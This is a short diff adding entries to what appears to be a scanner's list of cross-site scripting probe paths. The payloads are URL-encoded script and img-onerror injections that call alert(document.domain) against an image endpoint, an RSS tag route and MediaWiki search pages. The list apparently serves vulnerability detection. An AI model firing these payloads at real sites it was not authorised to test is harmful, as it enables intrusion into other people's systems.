@@ -14,3 +14,7 @@
 /api/app-images/logo?color=red%7D%3C%2Fstyle%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3Cstyle%3Ex%7B
 /index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
 /w/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
+
+/rss/tag/%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E?token={{rss_token}}
+/index.php?title=Special:Ask&q=%5B%5BText%3A%3A{{url_encode(payload)}}%5D%5D&debug=1
+/w/index.php?title=Special:Ask&q=%5B%5BText%3A%3A{{url_encode(payload)}}%5D%5D&debug=1
